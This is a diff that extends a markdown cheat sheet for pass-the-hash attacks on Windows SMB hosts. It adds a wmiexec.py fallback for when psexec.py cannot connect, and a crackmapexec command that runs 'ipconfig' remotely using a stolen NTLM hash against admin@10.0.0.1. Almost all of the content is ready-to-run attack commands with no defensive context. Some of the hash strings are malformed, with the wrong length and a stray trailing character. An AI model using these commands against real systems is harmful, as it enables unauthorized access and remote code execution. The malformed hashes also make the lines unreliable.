@@ -139,3 +139,15 @@ pth-smbclient -U ignite/adminr%00000000000000000000000000000000:32196B56FFE6F45E
 ```
 python3 psexec.py -hashes ad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38a admin@10.0.0.1
 ```
+
+**Note:** When you received this error "[-] [Errno Connection error (10.0.0.1:445)] [Errno 113] No route to host", use wmiexec.py
+
+##### ➤  wmiexec.py (impacket)
+```
+python3 wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38a admin@10.0.0.1
+```
+
+##### ➤  Crackmapexec
+```
+crackmapexec smb 10.0.0.1 -u Admin -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
+```
